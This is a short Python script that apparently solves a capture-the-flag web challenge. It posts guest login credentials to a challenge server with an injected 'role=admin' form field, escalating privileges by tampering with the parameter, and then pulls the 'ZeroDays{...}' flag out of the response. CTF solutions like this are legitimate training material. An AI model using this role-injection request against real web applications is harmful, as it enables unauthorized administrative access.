import requests
import re

res = requests.post("http://challs.zerodays.events:8001/index.php",
    data='username=guest&password=guest&role=admin&login=',
    headers={
        "Content-Type": "application/x-www-form-urlencoded",
    },
)

print(re.findall(r"ZeroDays\{.*\}", res.text)[0])
